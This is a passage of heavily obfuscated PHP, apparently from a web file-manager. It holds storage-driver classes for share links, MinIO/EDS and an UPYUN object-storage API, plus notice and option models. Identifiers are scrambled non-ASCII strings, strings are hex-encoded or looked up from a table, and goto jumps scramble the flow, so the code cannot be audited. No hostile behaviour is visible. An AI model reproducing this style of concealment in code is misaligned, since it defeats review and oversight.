$this->copyMove($bƒÀôäˆï„, $c©™ƒ²è•˜, $EçØ©°Ã—³, $_SERVER[Ôğ—¤Šµˆ˜ñ£][545]); } private function copyMove($AæˆÃòˆÅÏ, $aòĞ¾²³¿Š, $Fˆ«—¾¹“õ, $bù™˜÷¾“ö) { goto cóí¡İƒˆä; e¾…Ñ®ƒéÚ: if ($B‰ß¸ñ¬–è->pathParse[$BöÉó“°»‡[1069]]) { $aòĞ¾²³¿Š = $B‰ß¸ñ¬–è->pathParse[$BöÉó“°»‡[1069]]; } else { $aòĞ¾²³¿Š = $aÀ¥æŸêÈŒ; } $AÑ´…­» = IO::copyMove($AæˆÃòˆÅÏ, $aòĞ¾²³¿Š, $Fˆ«—¾¹“õ, $bù™˜÷¾“ö); $AÑ´…­» = $this->getPathOuter($AÑ´…­»); goto dŠ¡¡—‰…Ş; dŠ¡¡—‰…Ş: return $AÑ´…­»; goto EÌ¹îƒËÏô; cóí¡İƒˆä: $BöÉó“°»‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÀ¥æŸêÈŒ = $aòĞ¾²³¿Š; $B‰ß¸ñ¬–è = IO::driverMake($aòĞ¾²³¿Š); goto e¾…Ñ®ƒéÚ; EÌ¹îƒËÏô: } public function pathThis($cß–ÙŠ‘ˆÓ) { return get_path_this($this->pathParse[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]); } public function pathFather($EŸ†Úäšë) { return get_path_father($this->pathParse[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]); } public function iconvSystem($aÒ‚‹—™Àİ) { return $aÒ‚‹—™Àİ; } protected function infoParse($fŸ§ù¯ÊÇ, $aƒÊßÒ½Ø„ = false) { $c„œæçÕ‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dãÒÀç·©¦ = $this->pathParse[$c„œæçÕ‘[480]][$c„œæçÕ‘[1092]] . $this->pathParse[$c„œæçÕ‘[1085]]; if ($aƒÊßÒ½Ø„) { $dìÑ‚†ê¯Õ = IO::infoWithChildren($dãÒÀç·©¦); } else { $dìÑ‚†ê¯Õ = IO::info($dãÒÀç·©¦); } $e‚½„éğ = $this->pathParse[$c„œæçÕ‘[480]]; return Action($c„œæçÕ‘[1235])->_shareItemeParse($dìÑ‚†ê¯Õ, $e‚½„éğ); } public function listAll($B°±Ûò™‘±) { $eƒ“ù¡²š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D«×ÏÄ¦Çµ = IO::listAll($B°±Ûò™‘±); $DÀÊ‹¹ïÆ‰ = $this->pathParse[$eƒ“ù¡²š[480]]; foreach ($D«×ÏÄ¦Çµ as &$E…‹ ‡ìÕÂ) { check_abort(); $b¾ÔÔÕ”‰å = IO::info($E…‹ ‡ìÕÂ[$eƒ“ù¡²š[76]]); $b¾ÔÔÕ”‰å = is_array($b¾ÔÔÕ”‰å) ? $b¾ÔÔÕ”‰å : array(); $E…‹ ‡ìÕÂ = array_merge($b¾ÔÔÕ”‰å, $E…‹ ‡ìÕÂ); $E…‹ ‡ìÕÂ[$eƒ“ù¡²š[85]] = Action($eƒ“ù¡²š[1235])->_shareItemeParse($E…‹ ‡ìÕÂ, $DÀÊ‹¹ïÆ‰); } unset($E…‹ ‡ìÕÂ); return $D«×ÏÄ¦Çµ; } public function getPathOuter($B«óÆÊ§»ª) { goto b°¸æø“¬; F‹è†ÈÖ‹²: if (substr($D›œÖ–«–‘, 0, strlen($aÍíËÂóä°)) != $aÍíËÂóä°) { return !1; } return $this->pathParse[$dÆŞ÷ˆéøÜ[1086]] . $dÆŞ÷ˆéøÜ[8] . ltrim($fŞÙ¶³¶Õ¬, $dÆŞ÷ˆéøÜ[8]); goto fíÊ”Òî¼¨; b°¸æø“¬: $dÆŞ÷ˆéøÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C»Å„ ‡æì = KodIO::parse($B«óÆÊ§»ª); if ($C»Å„ ‡æì[$dÆŞ÷ˆéøÜ[29]] == KodIO::KOD_SHARE_ITEM) { return $C»Å„ ‡æì[$dÆŞ÷ˆéøÜ[76]]; } goto Dæ²‚’ÓÓÀ; Dæ²‚’ÓÓÀ: $D›œÖ–«–‘ = KodIO::clear($B«óÆÊ§»ª); $aÍíËÂóä° = KodIO::clear($this->pathParse[$dÆŞ÷ˆéøÜ[480]][$dÆŞ÷ˆéøÜ[1092]]); $fŞÙ¶³¶Õ¬ = substr($D›œÖ–«–‘, strlen($aÍíËÂóä°)); goto F‹è†ÈÖ‹²; fíÊ”Òî¼¨: } public function getType() { $E¸¦’œ¼¬« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c»çˆô‚˜ = str_replace($E¸¦’œ¼¬«[72], $E¸¦’œ¼¬«[33], get_class($this)); return strtolower($c»çˆô‚˜); } public function isTypeObject($bŸà¸Œç¥ó) { return IO::isTypeObject($bŸà¸Œç¥ó); } public function info($f‚–¬ãòÒÚ) { return $this->infoParse($f‚–¬ãòÒÚ); } public function infoAuth($EÓŞÑÜÓÓ) { return $this->infoParse($EÓŞÑÜÓÓ); } public function infoWithChildren($e™Ÿˆ¼ò¯) { return $this->infoParse($e™Ÿˆ¼ò¯, !0); } public function infoFull($e’ğ‰’œà…) { return $this->infoParse($e’ğ‰’œà…); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($aÓÆ²Ò¤ô) { $this->pathParse = $aÓÆ²Ò¤ô; } protected function infoParse($C¤†ê’·ŒĞ, $BìĞÜô®†† = false) { $f·ƒ¯¦Ù¯‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return Action($f·ƒ¯¦Ù¯‰[1091])->sharePathInfo($this->pathParse[$f·ƒ¯¦Ù¯‰[76]], !0, $BìĞÜô®††); } public function listPath($dÂ™ä¡ÔƒÌ, $E®¦â´ªï = false) { $a×è½¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¶º¸”Êâ’ = IO::listPath($dÂ™ä¡ÔƒÌ, $E®¦â´ªï); foreach ($C¶º¸”Êâ’ as $cÄ‚ñ¼åìë => $D‰ã·Ÿ¸Œ») { if (!in_array($cÄ‚ñ¼åìë, array($a×è½¼[74], $a×è½¼[75]))) { continue; } foreach ($D‰ã·Ÿ¸Œ» as $A£…íìé¨Ì => $E£›Ö¸®É) { $E£›Ö¸®É = Action($a×è½¼[1244])->parsePathChildren($E£›Ö¸®É, array($a×è½¼[416] => $dÂ™ä¡ÔƒÌ)); $C¶º¸”Êâ’[$cÄ‚ñ¼åìë][$A£…íìé¨Ì] = Action($a×è½¼[1091])->shareItemInfo($E£›Ö¸®É); } } return $C¶º¸”Êâ’; } public function listAll($Fè˜²¤‚Ç) { $Bö¼ƒÇÊÌ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¿Æ‘£Š‡¶ = IO::listAll($Fè˜²¤‚Ç); foreach ($C¿Æ‘£Š‡¶ as &$Bò©·—ƒÍé) { $CÌ‡¦…˜Ïó = IO::info($Bò©·—ƒÍé[$Bö¼ƒÇÊÌ[76]]); $CÌ‡¦…˜Ïó = is_array($CÌ‡¦…˜Ïó) ? $CÌ‡¦…˜Ïó : array(); $Bò©·—ƒÍé = array_merge($CÌ‡¦…˜Ïó, $Bò©·—ƒÍé); $Bò©·—ƒÍé[$Bö¼ƒÇÊÌ[85]] = Action($Bö¼ƒÇÊÌ[1091])->shareItemInfo($Bò©·—ƒÍé); } unset($Bò©·—ƒÍé); return $C¿Æ‘£Š‡¶; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($aÇô–ª·ïª) { parent::__construct($aÇô–ª·ïª); } } goto D‹®ô‰µ¬; B‹—ƒ­Æ™ƒ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x6e\157\x74\151\x63\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x63\x6f\156\x74\145\x6e\x74", "\x61\165\x74\150", "\155\x6f\x64\x65", "\x74\x69\x6d\145", "\164\171\160\145", "\154\145\166\145\154", "\145\x6e\x61\142\x6c\145", "\163\x6f\162\x74"); public function listData($DŒÕ‘İß•¹ = false, $F³çË„Ó¦ƒ = "\x73\157\162\x74", $eø™Åæğªæ = false) { return parent::listData($DŒÕ‘İß•¹, $F³çË„Ó¦ƒ, $eø™Åæğªæ); } public function add($c“î–Ùâ½‰) { $d™ÂŠõ¿ëŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e¼—¸–ÊĞÆ = time(); if ($c“î–Ùâ½‰[$d™ÂŠõ¿ëŒ[12]] == $d™ÂŠõ¿ëŒ[2129]) { $e¼—¸–ÊĞÆ = strtotime($c“î–Ùâ½‰[$d™ÂŠõ¿ëŒ[197]]); } $c“î–Ùâ½‰[$d™ÂŠõ¿ëŒ[197]] = $e¼—¸–ÊĞÆ; return parent::insert($c“î–Ùâ½‰); } public function update($EóØÁöî˜´, $CöÙƒˆãÚ) { goto AÌ¤‰™Î²; AÌºèø¤Ò: $C§í´£‹ÀÁ = time(); if ($CöÙƒˆãÚ[$A´²Ë­…ğ[12]] == $A´²Ë­…ğ[2129]) { $C§í´£‹ÀÁ = strtotime($CöÙƒˆãÚ[$A´²Ë­…ğ[197]]); } $CöÙƒˆãÚ[$A´²Ë­…ğ[197]] = $C§í´£‹ÀÁ; goto a•õ¡®ÜÉ¼; a•õ¡®ÜÉ¼: return parent::update($EóØÁöî˜´, $CöÙƒˆãÚ); goto EŒœ«ãá; AÌ¤‰™Î²: $A´²Ë­…ğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Cù“÷ÒöÏ = $this->listData($EóØÁöî˜´); if (!$Cù“÷ÒöÏ) { return !1; } goto AÌºèø¤Ò; EŒœ«ãá: } public function remove($Bˆ®Îˆ­Ú×) { $c¯àùçÑÎ¾ = $this->listData($Bˆ®Îˆ­Ú×); if (!$c¯àùçÑÎ¾ || $c¯àùçÑÎ¾[$_SERVER[Ôğ—¤Šµˆ˜ñ£][1192]]) { return !1; } return parent::remove($Bˆ®Îˆ­Ú×); } public function sort($bÑ±²õ¬š, $EöÉ°öğ´å) { return parent::update($bÑ±²õ¬š, $EöÉ°öğ´å); } public function enable($DÁƒó¤„ëĞ, $Bïô••Ñçî) { return parent::update($DÁƒó¤„ëĞ, array($_SERVER[Ôğ—¤Šµˆ˜ñ£][2130] => $Bïô••Ñçî)); } private function initUserOption() { $D¹˜²õ¹” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->optionType = $D¹˜²õ¹”[2131]; $this->modelType = $D¹˜²õ¹”[2132]; $this->field = array($D¹˜²õ¹”[2133], $D¹˜²õ¹”[28], $D¹˜²õ¹”[197], $D¹˜²õ¹”[29], $D¹˜²õ¹”[2134], $D¹˜²õ¹”[731], $D¹˜²õ¹”[189]); } public function userNoticeGet($a»à’ˆ‘Æ¬ = false) { $this->initUserOption(); return parent::listData($a»à’ˆ‘Æ¬, $_SERVER[Ôğ—¤Šµˆ˜ñ£][395], !0); } public function userNoticeAdd($f¬­Öç¡™Ö) { $b‘Üª¸¸¨¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->initUserOption(); $C•Âƒ¤™Ù = $this->findByKey($b‘Üª¸¸¨¹[2133], $f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[395]]); if ($C•Âƒ¤™Ù) { return !0; } $A¦§·‹«±¼ = array($b‘Üª¸¸¨¹[2133] => $f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[395]], $b‘Üª¸¸¨¹[28] => $f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[28]], $b‘Üª¸¸¨¹[197] => $f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[197]], $b‘Üª¸¸¨¹[29] => isset($f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[29]]) ? $f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[29]] : 1, $b‘Üª¸¸¨¹[2134] => isset($f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[2134]]) ? $f¬­Öç¡™Ö[$b‘Üª¸¸¨¹[2134]] : 0, $b‘Üª¸¸¨¹[731] => 0, $b‘Üª¸¸¨¹[189] => 0); return parent::insert($A¦§·‹«±¼); } public function userNoticeEdit($CÙ¼òô®Çğ, $BğÀä¦Õìƒ) { $this->initUserOption(); return parent::update($CÙ¼òô®Çğ, $BğÀä¦Õìƒ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\155\x5f\157\160\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\157\154\145", "\162\x6f\154\145\107\x72\157\x75\x70", "\162\x65\147\151\x73\164", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($D‚æÛÒÕ Ô) { return "\123\x79\163\x74\x65\x6d\117\160\x74\x69\157\x6e\137{$D‚æÛÒÕ Ô}"; } protected function optionDefault($dÛä—öİ¿á = '') { $f²¹Éá°Å =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($dÛä—öİ¿á == $f²¹Éá°Å[33]) { return $GLOBALS[$f²¹Éá°Å[6]][$f²¹Éá°Å[379]]; } } } class SystemRecordModel extends ModelBaseLight { } goto DØØó·é Ú; e»×¤ğ…®: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\57\x2f\166\x30\56\141\160\151\56\x75\160\171\165\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($BÏíÜİÁ¤ª) { parent::__construct(); $this->_init($BÏíÜİÁ¤ª); } public function _init($EÏ¦ÕšÕõ) { $Dš£•éËÈ‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($EÏ¦ÕšÕõ as $BÒÕ——¬Ö => $b¯®‡”Ü¶) { if (isset($this->{$BÒÕ——¬Ö})) { $this->{$BÒÕ——¬Ö} = $b¯®‡”Ü¶; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Dš£•éËÈ‘[1350] . LNG($Dš£•éËÈ‘[1283])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($CÖ×İĞ¥„‰, $CŒ¬ê¬÷¯ô = "\x47\x45\x54") { $Bâ›‡‹Ù¶ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¿‰²’…çÈ = gmdate($Bâ›‡‹Ù¶ç[1316]); $e‡èŸ…İ’Ï = base64_encode(hash_hmac($Bâ›‡‹Ù¶ç[1351], "{$CŒ¬ê¬÷¯ô}\46{$CÖ×İĞ¥„‰}\x26{$C¿‰²’…çÈ}", md5("{$this->userpass}"), !0)); $b¢‚Ùˆ©éå = array("\x41\165\x74\150\157\x72\x69\172\x61\x74\x69\157\x6e\72\x55\120\x59\x55\x4e\x20{$this->username}\72{$e‡èŸ…İ’Ï}", "\x44\141\x74\x65\x3a{$C¿‰²’…çÈ}"); return $b¢‚Ùˆ©éå; } public function ussRequest($B…Ä”¨Ì†, $e¡ö‡íäˆ = "\x47\105\124", $aï§”Å…Ùğ = false, $Fèöí”¯œ = false, $E‚Œ»Ã×†Ê = false) { goto Eñ³ÃŞ É; Eñ³ÃŞ É: $F¤èõßõ¾  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B…Ä”¨Ì† = trim($B…Ä”¨Ì†, $F¤èõßõ¾ [8]); $a½Ÿ¬Ó½ÂŸ = "\57{$this->bucket}\x2f{$B…Ä”¨Ì†}"; goto c¾ÂÎáæß; c¾ÂÎáæß: $eŸˆ¤İ²ğ = $this->ussHeaders($a½Ÿ¬Ó½ÂŸ, $e¡ö‡íäˆ); if ($Fèöí”¯œ) { $eŸˆ¤İ²ğ = array_merge($eŸˆ¤İ²ğ, $Fèöí”¯œ); } $AˆØãÌ‘˜‰ = url_request($this->endpoint . $a½Ÿ¬Ó½ÂŸ, $e¡ö‡íäˆ, $aï§”Å…Ùğ, $eŸˆ¤İ²ğ, $E‚Œ»Ã×†Ê); goto CõñÁ®ÎÄ; CõñÁ®ÎÄ: if (!$AˆØãÌ‘˜‰) { return array($F¤èõßõ¾ [1107] => !1, $F¤èõßõ¾ [1109] => $F¤èõßõ¾ [1352]); } if (strtolower($e¡ö‡íäˆ) == $F¤èõßõ¾ [190] || in_array($AˆØãÌ‘˜‰[$F¤èõßõ¾ [1107]], array($F¤èõßõ¾ [1210], $F¤èõßõ¾ [1353]))) { $aï§”Å…Ùğ = $AˆØãÌ‘˜‰[$F¤èõßõ¾ [1354]]; } else { $aï§”Å…Ùğ = json_decode($AˆØãÌ‘˜‰[$F¤èõßõ¾ [1109]], !0); if (!$aï§”Å…Ùğ) { $aï§”Å…Ùğ = $AˆØãÌ‘˜‰[$F¤èõßõ¾ [1109]]; } else { if (!$AˆØãÌ‘˜‰[$F¤èõßõ¾ [731]] && isset($aï§”Å…Ùğ[$F¤èõßõ¾ [1355]])) { $aï§”Å…Ùğ = $aï§”Å…Ùğ[$F¤èõßõ¾ [1355]]; } } } return array($F¤èõßõ¾ [1107] => $AˆØãÌ‘˜‰[$F¤èõßõ¾ [731]], $F¤èõßõ¾ [1109] => $aï§”Å…Ùğ); goto c˜˜ŞÙÑË; c˜˜ŞÙÑË: } public function mkfile($f™§ô˜ÊšÉ, $e¼Ù§‰æ = '', $E’º§å¨ = REPEAT_RENAME) { if ($this->setContent($f™§ô˜ÊšÉ, $e¼Ù§‰æ)) { return $this->getPathOuter($f™§ô˜ÊšÉ); } return !1; } public function mkdir($eƒˆàè‹ôÆ, $F‘ ùÁƒÔå = REPEAT_SKIP) { $d°‘çø’®› =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÁÇŠËÕ¨£ = trim($eƒˆàè‹ôÆ, $d°‘çø’®›[8]); if ($this->_isFolder($AÁÇŠËÕ¨£)) { return $this->getPathOuter($AÁÇŠËÕ¨£); } $eŠğˆ™ªŞ” = array($d°‘çø’®›[1356]); $b©ŠãÑÛñğ = $this->ussRequest($AÁÇŠËÕ¨£, $d°‘çø’®›[224], !1, $eŠğˆ™ªŞ”); return $b©ŠãÑÛñğ[$d°‘çø’®›[1107]] ? $this->getPathOuter($AÁÇŠËÕ¨£) : !1; } public function copyFile($BÉ‹ë–šÑˆ, $cùù§Á¨Å) { $cåƒ„ˆºÏ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dá•Ø—¡  = array($cåƒ„ˆºÏ[1357] . "\57{$this->bucket}\x2f{$BÉ‹ë–šÑˆ}", $cåƒ„ˆºÏ[1358]); $F«†§Šåø‘ = $this->ussRequest($cùù§Á¨Å, $cåƒ„ˆºÏ[226], !1, $dá•Ø—¡ ); return $F«†§Šåø‘[$cåƒ„ˆºÏ[1107]] ? !0 : $this->getPathOuter($cùù§Á¨Å); } public function moveFile($a¯·ï‰ôŸ“, $b·ËğåÂäí) { $f±–ÒªÚâª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f„Î÷¢ØàÎ = array($f±–ÒªÚâª[1359] . "\x2f{$this->bucket}\x2f{$a¯·ï‰ôŸ“}", $f±–ÒªÚâª[1358]); $A³•¥†ğº = $this->ussRequest($b·ËğåÂäí, $f±–ÒªÚâª[226], !1, $f„Î÷¢ØàÎ); return $A³•¥†ğº[$f±–ÒªÚâª[1107]] ? !0 : $this->getPathOuter($b·ËğåÂäí); } public function delFile($A¤¥Û£¦») { $c­Ü¨ã˜Ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cä…¶Á£Àˆ = $this->ussRequest($A¤¥Û£¦», $c­Ü¨ã˜Ä[1360]); return $cä…¶Á£Àˆ[$c­Ü¨ã˜Ä[1107]] ? !0 : !1; } public function delFolder($dÓëïÕå…) { goto aÉĞéâ‚…¸; aôâÏ¾É¾‚: return $DÂ„Ì ºÙ[$bŞÆ¾Ìî¿ª[1107]]; goto D§éØâˆÒŒ; aÉĞéâ‚…¸: $bŞÆ¾Ìî¿ª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->exist($dÓëïÕå…)) { return !0; } $this->listItemCache = !1; goto C‰¯Œ·ˆªÌ; C‰¯Œ·ˆªÌ: $CŞ¾˜©ÍÃ = $f¦«ƒ¢’¼ò = array(); $this->fileList($dÓëïÕå…, $CŞ¾˜©ÍÃ, $f¦«ƒ¢’¼ò, !0); $this->listItemCache = !0; goto eòÃ‰óˆ‘; eòÃ‰óˆ‘: foreach ($f¦«ƒ¢’¼ò as $E„Ôä×ïÉŠ) { $DÂ„Ì ºÙ = $this->ussRequest($E„Ôä×ïÉŠ[$bŞÆ¾Ìî¿ª[28]], $bŞÆ¾Ìî¿ª[1360]); if (!$DÂ„Ì ºÙ[$bŞÆ¾Ìî¿ª[1107]]) { return !1; } } foreach ($CŞ¾˜©ÍÃ as $d†„éÖæ¡†) { $DÂ„Ì ºÙ = $this->ussRequest($d†„éÖæ¡†, $bŞÆ¾Ìî¿ª[1360]); if (!$DÂ„Ì ºÙ[$bŞÆ¾Ìî¿ª[1107]]) { return !1; } } $DÂ„Ì ºÙ = $this->ussRequest($dÓëïÕå…, $bŞÆ¾Ìî¿ª[1360]); goto aôâÏ¾É¾‚; D§éØâˆÒŒ: } public function rename($aó°»ŒÛÆÇ, $FøÈ“æ‹ó) { if ($this->isFile($aó°»ŒÛÆÇ)) { $FøÈ“æ‹ó = get_path_father($aó°»ŒÛÆÇ) . $FøÈ“æ‹ó; return $this->moveFile($aó°»ŒÛÆÇ, $FøÈ“æ‹ó); } return $this->renameObject($aó°»ŒÛÆÇ, $FøÈ“æ‹ó); } public function fileInfo($f«…È­ß‰», $AíĞÓ˜¹­® = false, $aëñ›‹†¿æ = array()) { goto dĞ©Çñªîˆ; dĞ©Çñªîˆ: $eè‹³Êåê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¯¦Œ˜´êÂ = array($eè‹³Êåê[28] => $this->pathThis($f«…È­ß‰»), $eè‹³Êåê[76] => $this->getPathOuter($eè‹³Êåê[8] . $f«…È­ß‰»), $eè‹³Êåê[29] => $eè‹³Êåê[193], $eè‹³Êåê[78] => isset($aëñ›‹†¿æ[$eè‹³Êåê[78]]) ? $aëñ›‹†¿æ[$eè‹³Êåê[78]] : 0, $eè‹³Êåê[168] => $this->ext($f«…È­ß‰»)); if ($AíĞÓ˜¹­®) { return $f¯¦Œ˜´êÂ; } goto d¨À¶ã©ÆÚ; d¨À¶ã©ÆÚ: $f¯¦Œ˜´êÂ[$eè‹³Êåê[194]] = $f¯¦Œ˜´êÂ[$eè‹³Êåê[84]] = 0; $f¯¦Œ˜´êÂ[$eè‹³Êåê[195]] = $f¯¦Œ˜´êÂ[$eè‹³Êåê[196]] = !0; if (empty($aëñ›‹†¿æ)) { $aëñ›‹†¿æ = $this->objectMeta($f«…È­ß‰»); if (!$aëñ›‹†¿æ) { return $f¯¦Œ˜´êÂ; } } goto fÛãÑòóºÆ; fÛãÑòóºÆ: $f¯¦Œ˜´êÂ[$eè‹³Êåê[194]] = intval($aëñ›‹†¿æ[$eè‹³Êåê[1361]]); $f¯¦Œ˜´êÂ[$eè‹³Êåê[84]] = intval($aëñ›‹†¿æ[$eè‹³Êåê[1362]]); $f¯¦Œ˜´êÂ[$eè‹³Êåê[78]] = $aëñ›‹†¿æ[$eè‹³Êåê[78]]; goto fÈó™œÀ ; fÈó™œÀ : return $f¯¦Œ˜´êÂ; goto b´Š­¾ö³; b´Š­¾ö³: } public function folderInfo($eÖâÑÌã„‚, $d›Åçäå“Ï = false) { goto Bã¬ÄŞøùõ; AŸÔøªˆÄˆ: $fç±¦ºÇó„[$E˜³ÔÔğÃŒ[194]] = $fç±¦ºÇó„[$E˜³ÔÔğÃŒ[84]] = 0; $fç±¦ºÇó„[$E˜³ÔÔğÃŒ[195]] = $fç±¦ºÇó„[$E˜³ÔÔğÃŒ[196]] = !0; if (empty($dºå„ÂªÁŸ)) { $dºå„ÂªÁŸ = $this->objectMeta($eÖâÑÌã„‚); if (!$dºå„ÂªÁŸ) { return $fç±¦ºÇó„; } } goto E Ø…±Ìì; Bã¬ÄŞøùõ: $E˜³ÔÔğÃŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fç±¦ºÇó„ = array($E˜³ÔÔğÃŒ[28] => $this->pathThis($eÖâÑÌã„‚), $E˜³ÔÔğÃŒ[76] => $this->getPathOuter($E˜³ÔÔğÃŒ[8] . $eÖâÑÌã„‚), $E˜³ÔÔğÃŒ[29] => $E˜³ÔÔğÃŒ[77]); if ($d›Åçäå“Ï) { return $fç±¦ºÇó„; } goto AŸÔøªˆÄˆ; E Ø…±Ìì: $fç±¦ºÇó„[$E˜³ÔÔğÃŒ[194]] = intval($dºå„ÂªÁŸ[$E˜³ÔÔğÃŒ[1361]]); $fç±¦ºÇó„[$E˜³ÔÔğÃŒ[84]] = intval($dºå„ÂªÁŸ[$E˜³ÔÔğÃŒ[1362]]); return $fç±¦ºÇó„; goto d½™ˆ…Ú°°; d½™ˆ…Ú°°: } private function listObjs($d’ğ„‡Ë÷¥, $B…Ëáá²Ü‰ = 0, $cÀÆ„ßÉÁÁ = 1000) { $F·öÇ¯ó Ô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a§šÍçÒÄÁ = array($F·öÇ¯ó Ô[1363], $F·öÇ¯ó Ô[1364] . $cÀÆ„ßÉÁÁ); if ($B…Ëáá²Ü‰) { $a§šÍçÒÄÁ[] = $F·öÇ¯ó Ô[1365] . $B…Ëáá²Ü‰; } $eÛ¨æíİš¢ = $this->ussRequest($d’ğ„‡Ë÷¥, $F·öÇ¯ó Ô[228], !1, $a§šÍçÒÄÁ); return !$eÛ¨æíİš¢[$F·öÇ¯ó Ô[1107]] ? !1 : $eÛ¨æíİš¢[$F·öÇ¯ó Ô[1109]]; } private function fileList($bœè‘ÎäÅ, &$bÒ×ÓÈ‘ñœ, &$FÔ…ÈŠøç, $E‘•å²ÄÚ = false) { goto bğ·ÔŠ‡Æ; bø¾êòˆÍ: if ($b ›•Æ”Ûµ) { $this->cacheMethod($c¤ì„”êÛ[199], $bœè‘ÎäÅ, !0); } goto C§±çØõò‹; bğ·ÔŠ‡Æ: $c¤ì„”êÛ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C „Õ—Œìô = $c¤ì„”êÛ[33]; $D¥ğšäŸ¥ = 1000; goto aÉ„öˆ¹ùï; aÉ„öˆ¹ùï: $CÀì¨ŒŒ = rtrim($bœè‘ÎäÅ, $c¤ì„”êÛ[8]) . $c¤ì„”êÛ[8]; $b ›•Æ”Ûµ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $d©±õŞ‚İ = $this->listObjs($bœè‘ÎäÅ, $C „Õ—Œìô, $D¥ğšäŸ¥); if (!$d©±õŞ‚İ) { return !1; } $C „Õ—Œìô = isset($d©±õŞ‚İ[$c¤ì„”êÛ[1366]]) ? $d©±õŞ‚İ[$c¤ì„”êÛ[1366]] : $c¤ì„”êÛ[33]; $d‘–ÆÃÇÅ¼ = isset($d©±õŞ‚İ[$c¤ì„”êÛ[1367]]) ? $d©±õŞ‚İ[$c¤ì„”êÛ[1367]] : array(); foreach ($d‘–ÆÃÇÅ¼ as $D¹‚µÎÁ—£) { $døƒĞ¾éïÓ = $D¹‚µÎÁ—£[$c¤ì„”êÛ[29]] == $c¤ì„”êÛ[77] ? !0 : !1; $FÉ‘î­·ß = ltrim($CÀì¨ŒŒ . $D¹‚µÎÁ—£[$c¤ì„”êÛ[28]], $c¤ì„”êÛ[8]) . ($døƒĞ¾éïÓ ? $c¤ì„”êÛ[8] : $c¤ì„”êÛ[33]); $F¬èæàíŒé = array($c¤ì„”êÛ[28] => $FÉ‘î­·ß, $c¤ì„”êÛ[29] => $døƒĞ¾éïÓ ? $c¤ì„”êÛ[77] : $c¤ì„”êÛ[193], $c¤ì„”êÛ[78] => $D¹‚µÎÁ—£[$c¤ì„”êÛ[335]], $c¤ì„”êÛ[1362] => $D¹‚µÎÁ—£[$c¤ì„”êÛ[1368]]); if ($b ›•Æ”Ûµ) { $this->cacheMethod($c¤ì„”êÛ[199], $FÉ‘î­·ß, $døƒĞ¾éïÓ); $this->cacheMethod($c¤ì„”êÛ[200], $FÉ‘î­·ß, $F¬èæàíŒé); } if ($døƒĞ¾éïÓ) { $bÒ×ÓÈ‘ñœ[] = $FÉ‘î­·ß; if ($E‘•å²ÄÚ) { $this->fileList($FÉ‘î­·ß, $bÒ×ÓÈ‘ñœ, $FÔ…ÈŠøç, $E‘•å²ÄÚ); } continue; } $FÔ…ÈŠøç[] = $F¬èæàíŒé; } if (count($d‘–ÆÃÇÅ¼) < $D¥ğšäŸ¥) { break; } } goto bø¾êòˆÍ; C§±çØõò‹: } public function listPath($b…©’ÅÒ¶ˆ, $c£¨Íˆß±¤ = false) { $A°¯¨”ì¯ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¬éÛí·‡Ğ = $CÚŒ„ÜˆëÚ = array(); $this->fileList($b…©’ÅÒ¶ˆ, $C¬éÛí·‡Ğ, $CÚŒ„ÜˆëÚ); foreach ($C¬éÛí·‡Ğ as $b‚àÈ¶Ñ’± => $B†‡‚ôîÄç) { $C¬éÛí·‡Ğ[$b‚àÈ¶Ñ’±] = $this->folderInfo($B†‡‚ôîÄç, $c£¨Íˆß±¤); } foreach ($CÚŒ„ÜˆëÚ as $b‚àÈ¶Ñ’± => $B†‡‚ôîÄç) { $CÚŒ„ÜˆëÚ[$b‚àÈ¶Ñ’±] = 